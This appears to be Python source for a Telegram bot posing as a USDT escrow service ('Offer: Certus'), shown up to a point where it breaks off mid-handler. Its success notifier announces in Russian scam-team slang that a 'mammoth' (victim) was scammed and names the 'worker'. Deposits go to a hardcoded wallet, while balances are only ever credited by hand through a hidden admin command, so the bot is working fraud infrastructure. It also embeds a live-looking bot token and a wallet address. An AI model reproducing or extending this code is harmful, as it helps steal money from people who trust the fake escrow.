import asyncio
import logging
import html
from decimal import Decimal, InvalidOperation

import aiosqlite
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = "8853005206:AAGsv1GAgC9K6SfFL0Oh1YZ1X-L0smKYUZ0"
ADMIN_IDS = {8978080620}
SUCCESS_CHAT_IDS = {-1004311884662}
BOT_USERNAME = "OfferCertus_bot"
CRYPTO_WALLET = "UQAKFkhMHQhenIqDEm7IB-49I57T3z3b4TC8NCje4mhsyQw"

DB_PATH = "certus.db"

BRAND = "Offer: Certus"
MIN_DEAL = Decimal("1.00")
MAX_AMOUNT = Decimal("1000000.00")
DEAL_START_ID = 478
STARS_RATE = Decimal("0.02")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("xseon")

class CreateDeal(StatesGroup):
    role = State()
    amount = State()
    item = State()


class WithdrawFlow(StatesGroup):
    card_number = State()
    card_confirm = State()
    card_amount = State()
    crypto_number = State()
    crypto_confirm = State()
    crypto_amount = State()
    stars_amount = State()

def money(value) -> str:
    return f"{Decimal(str(value)):,.2f} USDT"


def parse_amount(raw: str):
    try:
        amount = Decimal((raw or "").strip().replace(",", "."))
        if not amount.is_finite():
            return None
        amount = amount.quantize(Decimal("0.01"))
        if amount <= 0 or amount > MAX_AMOUNT:
            return None
        return amount
    except (InvalidOperation, AttributeError):
        return None

LINE = "───────────────────────────────"
BRAND_LINE = (
    "<code>        ✦Offer: Certus✦     </code>"
)


def header() -> str:
    return f"{BRAND_LINE}\n<code>{LINE}</code>\n"

def btn(text: str, data: str, style: str = "primary"):
    return InlineKeyboardButton(text=text, callback_data=data, style=style)


async def notify_success_chat(deal, seller_name, buyer_name):
    """Публикует сообщение об успешной сделке в настроенные чаты."""
    if not SUCCESS_CHAT_IDS:
        return

    text = (
        f"✌️🫩 <b>мамонта наебали</b>\n\n"
        f"🦣 <b>Покупатель:</b> @{html.escape(buyer_name or '—')}\n"
        f"👨‍💻 <b>Воркер:</b> @{html.escape(seller_name or '—')}\n"
        f"<b>Товар:</b> {html.escape(deal['item'])}\n"
        f"<b>Сумма:</b> <b>{money(deal['amount'])}</b>\n\n"
        
    )

    for chat_id in SUCCESS_CHAT_IDS:
        try:
            await bot.send_message(chat_id, text)
        except Exception:
            logger.exception(
                "Could not send success message to chat %s", chat_id
            )

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🤝 Создать сделку", "menu_create", "success")],
        [
            btn("👤 Профиль", "menu_profile", "primary"),
            btn("💰 Баланс", "menu_balance", "primary"),
        ],
        [
            btn("📋 Мои сделки", "menu_my_deals", "primary"),
            btn("💸 Вывод", "menu_withdraw", "primary"),
        ],
        [btn("🛡 Безопасность", "menu_security", "primary")],
    ])


def role_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("🛒 Я продавец", "role_seller", "primary"),
            btn("🛍 Я покупатель", "role_buyer", "primary"),
        ],
        [btn("❌ Отмена", "to_main", "danger")],
    ])


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("❌ Отмена", "to_main", "danger")]
    ])


def back_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("⬅️ Главное меню", "to_main", "primary")]
    ])


def pay_kb(deal_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("💸 Отправить деньги с баланса", f"deal_pay:{deal_id}", "success")],
        [btn("⚠️ Открыть спор", f"deal_dispute:{deal_id}", "danger")],
    ])


def ship_kb(deal_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📦 Я отправил товар", f"deal_ship:{deal_id}", "success")],
        [btn("⚠️ Открыть спор", f"deal_dispute:{deal_id}", "danger")],
    ])


def receive_kb(deal_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ Я получил товар", f"deal_recv:{deal_id}", "success")],
        [btn("⚠️ Открыть спор", f"deal_dispute:{deal_id}", "danger")],
    ])


def deposit_start_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("💰 Пополнить USDT", "dep_start", "success"),
            btn("⬅️ Назад", "to_main", "primary"),
        ],
    ])


def deposit_check_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("📤 Я отправил", "dep_sent", "success"),
            btn("⬅️ Назад", "to_main", "primary"),
        ],
    ])


def withdraw_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("💳 На карту", "wd_card", "primary"),
            btn("🪙 На крипто-кошелёк", "wd_crypto", "primary"),
        ],
        [btn("⭐ Получить звёздами", "wd_stars", "primary")],
        [btn("⬅️ Назад", "to_main", "primary")],
    ])


def confirm_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("✅ Да, всё верно", "wd_confirm", "success"),
            btn("✏️ Изменить", "wd_retry", "primary"),
        ],
    ])


def admin_withdraw_kb(withdraw_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ Отметить выплаченным", f"admin_wd_paid:{withdraw_id}", "success")],
        [btn("❌ Отклонить заявку", f"admin_wd_reject:{withdraw_id}", "danger")],
    ])

def main_text(user, balance):
    name = html.escape(user.full_name or "Пользователь")
    return (
        f"{header()}\n"
        f"Добро пожаловать, <b>{name}</b>!\n\n"
        "🤝 <b>Безопасные сделки между пользователями</b>\n\n"
        f"💰 Ваш баланс: <b>{money(balance)}</b>\n\n"
        "<blockquote>Перед подтверждением сделки "
        "проверяйте все условия.</blockquote>\n\n"
        "Выберите нужный раздел ниже."
    )


def profile_text(user, balance, deals_count, completed_count):
    username = f"@{html.escape(user.username)}" if user.username else "Не указан"
    return (
        f"{header()}\n"
        "👤 <b>ВАШ ПРОФИЛЬ</b>\n\n"
        f"🪪 <b>ID:</b> <code>{user.id}</code>\n"
        f"🏷 <b>Имя:</b> {html.escape(user.full_name or 'Не указано')}\n"
        f"🔗 <b>Username:</b> {username}\n\n"
        f"<code>{LINE}</code>\n\n"
        "💳 <b>ФИНАНСОВАЯ ИНФОРМАЦИЯ</b>\n"
        f"💰 <b>Баланс:</b> {money(balance)}\n\n"
        "📊 <b>СТАТИСТИКА</b>\n"
        f"🤝 Всего сделок: <b>{deals_count}</b>\n"
        f"✅ Завершено: <b>{completed_count}</b>\n\n"
        "<blockquote>Данные обновляются "
        "по мере работы с ботом.</blockquote>"
    )


def balance_text(balance):
    return (
        f"{header()}\n"
        "💰 <b>ВАШ БАЛАНС</b>\n\n"
        f"Доступно: <b>{money(balance)}</b>\n\n"
        "<blockquote>Баланс в боте не является "
        "подтверждением реального перевода "
        "USDT в блокчейне.</blockquote>"
    )


def security_text():
    return (
        f"{header()}\n"
        "🛡 <b>БЕЗОПАСНОСТЬ</b>\n\n"
        "• Проверяйте username второго участника.\n"
        "• Согласуйте описание, сумму и условия до начала сделки.\n"
        "• Не доверяйте скриншотам вместо независимой проверки платежа.\n"
        "• Не сообщайте никому токен бота или секретные ключи.\n"
        "• Не подтверждайте получение, пока не проверили результат.\n\n"
        "<blockquote>⚠️ Важно: эта версия не подключена "
        "к блокчейну и не подтверждает платежи "
        "автоматически.</blockquote>"
    )


def deal_card_text(deal, status_label):
    return (
        f"{header()}\n"
        f"🤝 <b>СДЕЛКА #{deal['id']}</b>\n\n"
        f"👤 <b>Продавец:</b> @{html.escape(deal['seller_name'] or '—')}\n"
        f"👥 <b>Покупатель:</b> @{html.escape(deal['buyer_name'] or '—')}\n\n"
        f"💰 <b>Сумма:</b> <b>{money(deal['amount'])}</b>\n"
        f"📝 <b>Товар:</b> {html.escape(deal['item'])}\n"
        f"📌 <b>Статус:</b> {status_label}\n\n"
        f"<code>{LINE}</code>\n\n"
        "📜 <b>ИНСТРУКЦИЯ</b>\n\n"
        "<blockquote>1. Покупатель вносит сумму\n"
        "2. Продавец передаёт товар\n"
        "3. Покупатель подтверждает\n"
        "4. Бот переводит деньги</blockquote>\n\n"
        "🛡 <i>Средства защищены ботом "
        "до подтверждения сделки.</i>"
    )


STATUS_LABELS = {
    "created":   "⏳ Ожидает оплаты",
    "funded":    "💰 Средства внесены",
    "shipped":   "📦 Товар отправлен",
    "completed": "✅ Завершена",
    "disputed":  "⚠️ Открыт спор",
}

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA journal_mode=WAL")
        await db.execute("PRAGMA foreign_keys=ON")

        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT,
                balance TEXT NOT NULL DEFAULT '0.00',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS deals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                creator_id INTEGER NOT NULL,
                creator_role TEXT NOT NULL,
                partner_id INTEGER,
                seller_id INTEGER,
                buyer_id INTEGER,
                amount TEXT NOT NULL,
                item TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'created',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS withdrawals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                method TEXT NOT NULL,
                destination TEXT NOT NULL,
                amount TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS ledger (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                amount TEXT NOT NULL,
                operation TEXT NOT NULL,
                reference TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        await db.commit()

        prev = DEAL_START_ID - 1
        async with db.execute(
            "SELECT seq FROM sqlite_sequence WHERE name='deals'"
        ) as cur:
            row = await cur.fetchone()
        if row is None:
            await db.execute(
                "INSERT INTO sqlite_sequence(name, seq) VALUES('deals', ?)",
                (prev,),
            )
        elif row[0] < prev:
            await db.execute(
                "UPDATE sqlite_sequence SET seq=? WHERE name='deals'",
                (prev,),
            )
        await db.commit()


async def register_user(user):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO users(user_id, username, full_name)
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                username=excluded.username,
                full_name=excluded.full_name
        """, (user.id, user.username, user.full_name or ""))
        await db.commit()


async def get_user_row(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute(
            "SELECT * FROM users WHERE user_id=?", (user_id,)
        )
        return await cur.fetchone()


async def get_balance(user_id):
    row = await get_user_row(user_id)
    return Decimal(row["balance"]) if row else Decimal("0.00")


async def get_stats(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "SELECT COUNT(*) FROM deals "
            "WHERE creator_id=? OR partner_id=?",
            (user_id, user_id),
        )
        total = (await cur.fetchone())[0]

        cur = await db.execute("""
            SELECT COUNT(*) FROM deals
            WHERE (creator_id=? OR partner_id=?)
              AND status='completed'
        """, (user_id, user_id))
        completed = (await cur.fetchone())[0]

        return total, completed


async def find_user_by_username(username: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute(
            "SELECT user_id, username, full_name FROM users "
            "WHERE lower(username)=lower(?)",
            (username,),
        )
        return await cur.fetchone()


async def credit_balance(user_id, amount, operation, reference=None):
    amount = Decimal(amount).quantize(Decimal("0.01"))
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("BEGIN IMMEDIATE")
        cur = await db.execute(
            "SELECT balance FROM users WHERE user_id=?", (user_id,)
        )
        row = await cur.fetchone()
        if not row:
            await db.rollback()
            return False, None

        new_balance = Decimal(row[0]) + amount
        await db.execute(
            "UPDATE users SET balance=? WHERE user_id=?",
            (str(new_balance), user_id),
        )
        await db.execute("""
            INSERT INTO ledger(user_id, amount, operation, reference)
            VALUES (?, ?, ?, ?)
        """, (user_id, str(amount), operation, reference))
        await db.commit()
        return True, new_balance


async def debit_balance(user_id, amount, operation, reference=None):
    amount = Decimal(amount).quantize(Decimal("0.01"))
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("BEGIN IMMEDIATE")
        cur = await db.execute(
            "SELECT balance FROM users WHERE user_id=?", (user_id,)
        )
        row = await cur.fetchone()
        if not row:
            await db.rollback()
            return False, None

        balance = Decimal(row[0])
        if balance < amount:
            await db.rollback()
            return False, balance

        new_balance = balance - amount
        await db.execute(
            "UPDATE users SET balance=? WHERE user_id=?",
            (str(new_balance), user_id),
        )
        await db.execute("""
            INSERT INTO ledger(user_id, amount, operation, reference)
            VALUES (?, ?, ?, ?)
        """, (user_id, str(-amount), operation, reference))
        await db.commit()
        return True, new_balance


async def create_deal_row(creator_id, role, amount, item):
    async with aiosqlite.connect(DB_PATH) as db:
        if role == "seller":
            seller_id, buyer_id = creator_id, None
        else:
            seller_id, buyer_id = None, creator_id
        cur = await db.execute("""
            INSERT INTO deals(creator_id, creator_role, seller_id, buyer_id,
                              amount, item, status)
            VALUES (?, ?, ?, ?, ?, ?, 'created')
        """, (creator_id, role, seller_id, buyer_id, str(amount), item))
        await db.commit()
        return cur.lastrowid


async def get_deal(deal_id):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute("""
            SELECT d.*,
                   s.username AS seller_name,
                   b.username AS buyer_name
            FROM deals d
            LEFT JOIN users s ON s.user_id = d.seller_id
            LEFT JOIN users b ON b.user_id = d.buyer_id
            WHERE d.id=?
        """, (deal_id,))
        return await cur.fetchone()


async def join_deal(deal_id, partner_id):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        await db.execute("BEGIN IMMEDIATE")
        cur = await db.execute(
            "SELECT creator_id, creator_role, partner_id FROM deals WHERE id=?",
            (deal_id,),
        )
        row = await cur.fetchone()
        if not row or row["partner_id"] is not None:
            await db.rollback()
            return False

        if partner_id == row["creator_id"]:
            await db.rollback()
            return False

        if row["creator_role"] == "seller":
            seller_id, buyer_id = row["creator_id"], partner_id
        else:
            seller_id, buyer_id = partner_id, row["creator_id"]

        await db.execute("""
            UPDATE deals
            SET partner_id=?, seller_id=?, buyer_id=?
            WHERE id=?
        """, (partner_id, seller_id, buyer_id, deal_id))
        await db.commit()
        return True


async def set_deal_status(deal_id, status):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE deals SET status=? WHERE id=?", (status, deal_id)
        )
        await db.commit()


async def get_user_deals(user_id, limit=20):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute("""
            SELECT d.*,
                   s.username AS seller_name,
                   b.username AS buyer_name
            FROM deals d
            LEFT JOIN users s ON s.user_id = d.seller_id
            LEFT JOIN users b ON b.user_id = d.buyer_id
            WHERE d.creator_id=? OR d.partner_id=?
            ORDER BY d.id DESC LIMIT ?
        """, (user_id, user_id, limit))
        return await cur.fetchall()


async def create_withdrawal(user_id, method, destination, amount):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("""
            INSERT INTO withdrawals(user_id, method, destination, amount, status)
            VALUES (?, ?, ?, ?, 'pending')
        """, (user_id, method, destination, str(amount)))
        await db.commit()
        return cur.lastrowid


async def set_withdrawal_status(withdraw_id, status):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        await db.execute("BEGIN IMMEDIATE")
        cur = await db.execute(
            "SELECT * FROM withdrawals WHERE id=?", (withdraw_id,)
        )
        row = await cur.fetchone()
        if not row or row["status"] != "pending":
            await db.rollback()
            return False, row

        await db.execute(
            "UPDATE withdrawals SET status=? "
            "WHERE id=? AND status='pending'",
            (status, withdraw_id),
        )
        await db.commit()
        return True, row

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher(storage=MemoryStorage())


async def send_menu(message: Message):
    await register_user(message.from_user)
    balance = await get_balance(message.from_user.id)
    await message.answer(
        main_text(message.from_user, balance),
        reply_markup=main_menu(),
    )

@dp.message(CommandStart(deep_link=True))
async def cmd_start_deep(message: Message, command: CommandObject,
                         state: FSMContext):
    await state.clear()
    await register_user(message.from_user)

    payload = command.args or ""
    if payload.startswith("deal_"):
        try:
            deal_id = int(payload.split("_", 1)[1])
        except Exception:
            await message.answer(
                f"{header()}\n❌ Неверная ссылка на сделку."
            )
            return

        deal = await get_deal(deal_id)
        if not deal:
            await message.answer(
                f"{header()}\n❌ Сделка не найдена."
            )
            return

        if deal["partner_id"] is None:
            ok = await join_deal(deal_id, message.from_user.id)
            if not ok:
                await message.answer(
                    f"{header()}\n❌ Нельзя вступить в свою же сделку."
                )
                return
            deal = await get_deal(deal_id)
            await send_deal_card_both(deal)
        else:
            if message.from_user.id not in (
                deal["seller_id"], deal["buyer_id"]
            ):
                await message.answer(
                    f"{header()}\n❌ Эта сделка уже занята."
                )
                return
            await send_deal_card_to_user(deal, message.chat.id)
        return

    await send_menu(message)


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await send_menu(message)


@dp.message(Command("menu"))
async def cmd_menu(message: Message, state: FSMContext):
    await state.clear()
    await send_menu(message)


@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        f"{header()}\n❌ Действие отменено.",
        reply_markup=main_menu(),
    )


@dp.message(Command("profile"))
async def cmd_profile(message: Message):
    await register_user(message.from_user)
    row = await get_user_row(message.from_user.id)
    total, completed = await get_stats(message.from_user.id)
    await message.answer(
        profile_text(message.from_user, row["balance"], total, completed),
        reply_markup=back_menu(),
    )


# =========================
# ADMIN: /qwertyuiop @username amount
# =========================

@dp.message(Command("qwertyuiop"))
async def cmd_admin_topup(message: Message, command: CommandObject):
    if message.from_user.id not in ADMIN_IDS:
        return

    parts = (command.args or "").split()
    if len(parts) != 2:
        await message.answer(
            f"{header()}\n"
            "⚙️ <b>АДМИН</b>\n\n"
            "Формат:\n"
            "<code>/qwertyuiop @username 100</code>"
        )
        return

    username = parts[0].lstrip("@").lower()
    amount = parse_amount(parts[1])

    if not username or not amount:
        await message.answer("❌ Укажи корректный username и сумму.")
        return

    target = await find_user_by_username(username)
    if not target:
        await message.answer(
            "❌ Пользователь не найден. Он должен сначала запустить бота."
        )
        return

    ok, new_balance = await credit_balance(
        target["user_id"], amount, "admin_credit",
        f"admin:{message.from_user.id}",
    )
    if not ok:
        await message.answer("❌ Не удалось обновить баланс.")
        return

    await message.answer(
        f"{header()}\n"
        "✅ <b>БАЛАНС ОБНОВЛЁН</b>\n\n"
        f"👤 Пользователь: @{html.escape(target['username'] or username)}\n"
        f"🆔 ID: <code>{target['user_id']}</code>\n"
        f"➕ Начислено: <b>{money(amount)}</b>\n"
        f"💰 Новый баланс: <b>{money(new_balance)}</b>"
    )

    try:
        await bot.send_message(
            target["user_id"],
            f"{header()}\n"
            "💰 <b>ИЗМЕНЕНИЕ БАЛАНСА</b>\n\n"
            f"Начислено администратором: <b>{money(amount)}</b>\n"
            f"Текущий баланс: <b>{money(new_balance)}</b>",
            reply_markup=back_menu(),
        )
    except Exception:
        logger.warning("Could not notify user %s", target["user_id"])

@dp.callback_query(F.data == "to_main")
async def cb_to_main(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await register_user(call.from_user)
    balance = await get_balance(call.from_user.id)
    text = main_text(call.from_user, balance)
    await call.answer()
    try:
        await call.message.edit_text(text, reply_markup=main_menu())
    except Exception:
        await call.message.answer(text, reply_markup=main_menu())


@dp.callback_query(F.data == "menu_profile")
async def cb_menu_profile(call: CallbackQuery):
    await register_user(call.from_user)
    row = await get_user_row(call.from_user.id)
    total, completed = await get_stats(call.from_user.id)
    text = profile_text(call.from_user, row["balance"], total, completed)
    await call.answer()
    try:
        await call.message.edit_text(text, reply_markup=back_menu())
    except Exception:
        await call.message.answer(text, reply_markup=back_menu())


@dp.callback_query(F.data == "menu_balance")
async def cb_menu_balance(call: CallbackQuery):
    await register_user(call.from_user)
    balance = await get_balance(call.from_user.id)
    await call.answer()
    try:
        await call.message.edit_text(
            balance_text(balance), reply_markup=back_menu()
        )
    except Exception:
        await call.message.answer(
            balance_text(balance), reply_markup=back_menu()
        )


@dp.callback_query(F.data == "menu_security")
async def cb_menu_security(call: CallbackQuery):
    await call.answer()
    try:
        await call.message.edit_text(
            security_text(), reply_markup=back_menu()
        )
    except Exception:
        await call.message.answer(
            security_text(), reply_markup=back_menu()
        )

@dp.callback_query(F.data == "menu_create")
async def cb_menu_create(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await register_user(call.from_user)
    await state.set_state(CreateDeal.role)
    await call.answer()
    text = (
        f"{header()}\n"
        "🤝 <b>СОЗДАНИЕ СДЕЛКИ · 1/3</b>\n\n"
        "<blockquote>Кем вы будете в этой сделке?</blockquote>\n\n"
        "🛒 <b>Продавец</b> — отдаёте товар, получаете деньги\n"
        "🛍 <b>Покупатель</b> — платите, получаете товар"
    )
    try:
        await call.message.edit_text(text, reply_markup=role_kb())
    except Exception:
        await call.message.answer(text, reply_markup=role_kb())


@dp.callback_query(CreateDeal.role, F.data.startswith("role_"))
async def cb_set_role(call: CallbackQuery, state: FSMContext):
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    await state.set_state(CreateDeal.amount)
    role_txt = "🛒 Продавец" if role == "seller" else "🛍 Покупатель"
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💰 <b>СОЗДАНИЕ СДЕЛКИ · 2/3</b>\n\n"
        f"👤 Ваша роль: <b>{role_txt}</b>\n\n"
        f"<blockquote>Введи сумму в USDT "
        f"(минимум {money(MIN_DEAL)}):</blockquote>",
        reply_markup=cancel_kb(),
    )


@dp.message(CreateDeal.amount)
async def deal_amount(message: Message, state: FSMContext):
    amount = parse_amount(message.text or "")
    if not amount or amount < MIN_DEAL:
        await message.answer(
            f"{header()}\n"
            f"❌ Введи корректную сумму "
            f"(минимум {money(MIN_DEAL)}).",
            reply_markup=cancel_kb(),
        )
        return

    await state.update_data(amount=str(amount))
    await state.set_state(CreateDeal.item)
    await message.answer(
        f"{header()}\n"
        "📝 <b>СОЗДАНИЕ СДЕЛКИ · 3/3</b>\n\n"
        f"💰 Сумма: <b>{money(amount)}</b>\n\n"
        "<blockquote>Опиши товар, услугу "
        "или условия сделки.</blockquote>",
        reply_markup=cancel_kb(),
    )


@dp.message(CreateDeal.item)
async def deal_item(message: Message, state: FSMContext):
    item = (message.text or "").strip()
    if not item or item.startswith("/"):
        await message.answer("❌ Напиши описание сделки.")
        return
    if len(item) > 1000:
        await message.answer("❌ Максимум 1000 символов.")
        return

    data = await state.get_data()
    if not data.get("role") or not data.get("amount"):
        await state.clear()
        await message.answer(
            f"{header()}\n❌ Сессия истекла.",
            reply_markup=back_menu(),
        )
        return

    amount = Decimal(data["amount"])
    deal_id = await create_deal_row(
        message.from_user.id, data["role"], amount, item
    )
    await state.clear()

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    safe_item = html.escape(item)

    await message.answer(
        f"{header()}\n"
        "✅ <b>СДЕЛКА СОЗДАНА</b>\n\n"
        f"🆔 Номер: <code>{deal_id}</code>\n"
        f"💰 Сумма: <b>{money(amount)}</b>\n"
        f"📝 Товар: {safe_item}\n\n"
        f"<blockquote>🔗 Ссылка для второго участника:\n"
        f"{link}</blockquote>\n\n"
        "<blockquote>📌 Отправь ссылку второму участнику.\n"
        "Карточка сделки появится, когда он войдёт.</blockquote>\n\n"
        "⚠️ Создание записи не означает, "
        "что деньги заблокированы.",
        reply_markup=back_menu(),
    )

async def send_deal_card_to_user(deal, chat_id):
    label = STATUS_LABELS.get(deal["status"], deal["status"])
    text = deal_card_text(deal, label)
    kb = None
    if chat_id == deal["buyer_id"] and deal["status"] == "created":
        kb = pay_kb(deal["id"])
    elif chat_id == deal["buyer_id"] and deal["status"] == "shipped":
        kb = receive_kb(deal["id"])
    elif chat_id == deal["seller_id"] and deal["status"] == "funded":
        kb = ship_kb(deal["id"])
    try:
        await bot.send_message(chat_id, text, reply_markup=kb)
    except Exception:
        logger.exception("Could not send deal card to %s", chat_id)


async def send_deal_card_both(deal):
    for chat_id in (deal["seller_id"], deal["buyer_id"]):
        if chat_id is None:
            continue
        await send_deal_card_to_user(deal, chat_id)


# =========================
# MY DEALS
# =========================

@dp.callback_query(F.data == "menu_my_deals")
async def cb_menu_my_deals(call: CallbackQuery):
    rows = await get_user_deals(call.from_user.id)
    await call.answer()
    if not rows:
        try:
            await call.message.edit_text(
                f"{header()}\n📋 <b>МОИ СДЕЛКИ</b>\n\n"
                "У тебя пока нет сделок.",
                reply_markup=back_menu(),
            )
        except Exception:
            await call.message.answer(
                f"{header()}\n📋 <b>МОИ СДЕЛКИ</b>\n\n"
                "У тебя пока нет сделок.",
                reply_markup=back_menu(),
            )
        return

    for row in rows:
        label = STATUS_LABELS.get(row["status"], row["status"])
        text = deal_card_text(row, label)
        kb = None
        if row["status"] == "created" and call.from_user.id == row["buyer_id"]:
            kb = pay_kb(row["id"])
        elif row["status"] == "funded" and call.from_user.id == row["seller_id"]:
            kb = ship_kb(row["id"])
        elif row["status"] == "shipped" and call.from_user.id == row["buyer_id"]:
            kb = receive_kb(row["id"])
        await call.message.answer(text, reply_markup=kb)


# =========================
# DEPOSIT
# =========================

@dp.callback_query(F.data == "menu_deposit")
async def cb_menu_deposit(call: CallbackQuery, state: FSMContext):
    await state.clear()
    balance = await get_balance(call.from_user.id)
    await call.answer()
    text = (
        f"{header()}\n"
        "💰 <b>ПОПОЛНЕНИЕ БАЛАНСА</b>\n\n"
        f"💳 Текущий баланс: <b>{money(balance)}</b>\n\n"
        "<blockquote>📥 Способ пополнения\n"
        "USDT в сети TON\n"
        "Минимум — 1 USDT\n"
        "Зачисление — до 10 минут</blockquote>\n\n"
        "Нажми «Пополнить USDT»."
    )
    try:
        await call.message.edit_text(text, reply_markup=deposit_start_kb())
    except Exception:
        await call.message.answer(text, reply_markup=deposit_start_kb())


@dp.callback_query(F.data == "dep_start")
async def cb_dep_start(call: CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💳 <b>РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ</b>\n\n"
        f"🌐 <b>Сеть:</b> TON (USDT)\n\n"
        f"<blockquote>👛 Адрес кошелька:\n"
        f"{CRYPTO_WALLET}</blockquote>\n\n"
        "<blockquote>⚠️ Важно:\n"
        "• Только сеть TON\n"
        "• Только USDT\n"
        "• Другая сеть — потеря средств</blockquote>\n\n"
        "📤 После оплаты нажми «Я отправил» —\n"
        "мы проверим поступление.",
        reply_markup=deposit_check_kb(),
    )


@dp.callback_query(F.data == "dep_sent")
async def cb_dep_sent(call: CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "⏳ <b>ПЛАТЁЖ НА ПРОВЕРКЕ</b>\n\n"
        "📌 Статус: <b>Проверяем</b>\n\n"
        "<blockquote>⏱ Время проверки\n"
        "Обычно 5–10 минут\n"
        "В редких случаях — до 1 часа</blockquote>\n\n"
        "<blockquote>📣 Что дальше\n"
        "Как только средства поступят,\n"
        "баланс обновится.\n"
        "Уведомление придёт сюда.</blockquote>",
        reply_markup=back_menu(),
    )

    balance = await get_balance(call.from_user.id)
    uname = call.from_user.username or str(call.from_user.id)
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"{header()}\n"
                "🔔 <b>НОВЫЙ ПЛАТЁЖ</b>\n\n"
                f"👤 Пользователь: @{html.escape(uname)}\n"
                f"🆔 ID: <code>{call.from_user.id}</code>\n"
                f"💰 Баланс: <b>{money(balance)}</b>\n\n"
                f"Пополнить вручную:\n"
                f"<code>/qwertyuiop @{uname} СУММА</code>",
            )
        except Exception:
            logger.exception("Could not notify admin %s", admin_id)


# =========================
# WITHDRAW
# =========================

@dp.callback_query(F.data == "menu_withdraw")
async def cb_menu_withdraw(call: CallbackQuery, state: FSMContext):
    await state.clear()
    balance = await get_balance(call.from_user.id)
    await call.answer()
    text = (
        f"{header()}\n"
        "💸 <b>ВЫВОД СРЕДСТВ</b>\n\n"
        f"💰 Доступно: <b>{money(balance)}</b>\n\n"
        "<blockquote>📋 Способы вывода\n"
        "💳 На карту — до 24 часов\n"
        "🪙 На крипто-кошелёк — до 24 часов\n"
        "⭐ Звёздами Telegram — до 24 часов</blockquote>\n\n"
        "Выбери способ ниже."
    )
    try:
        await call.message.edit_text(text, reply_markup=withdraw_kb())
    except Exception:
        await call.message.answer(text, reply_markup=withdraw_kb())


@dp.callback_query(F.data == "wd_card")
async def cb_wd_card(call: CallbackQuery, state: FSMContext):
    await state.set_state(WithdrawFlow.card_number)
    await call.answer()
    await call.message.edit_text(
        f"{header()}\n"
        "💳 <b>ВЫВОД НА КАРТУ · 1/2</b>\n\n"
        "<blockquote>Введи номер карты "
        "или номер телефона.</blockquote>",
        reply_markup=back_menu(),
    )


@dp.message(WithdrawFlow.card_number)
async def wd_card_number(message: Message, state: FSMContext):
    dest = (message.text or "").strip()
    if not dest or len(dest) > 100 or dest.startswith("/"):
        await message.answer("❌ Введи корректные реквизиты.")
        return
